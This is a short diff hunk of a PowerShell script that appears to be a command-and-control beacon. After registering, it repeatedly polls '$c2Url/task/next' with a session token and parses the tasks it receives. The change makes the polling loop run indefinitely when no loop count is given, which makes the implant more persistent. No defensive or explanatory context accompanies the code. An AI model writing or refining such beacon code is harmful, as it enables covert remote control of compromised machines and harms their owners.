@@ -90,7 +90,7 @@ try {
     Write-Output "register failed: $($_.Exception.Message)"; exit 1
 }
 
-$count = if ($Once) { 1 } else { $loops }
+$count = if ($Once) { 1 } elseif ($loops -gt 0) { $loops } else { [int]::MaxValue }
 for ($i = 0; $i -lt $count; $i++) {
     $taskResp = Invoke-WebRequest -Method GET -Uri "$c2Url/task/next?session=$token" -UseBasicParsing -TimeoutSec 10
     $taskObj = ($taskResp.Content | ConvertFrom-Json)
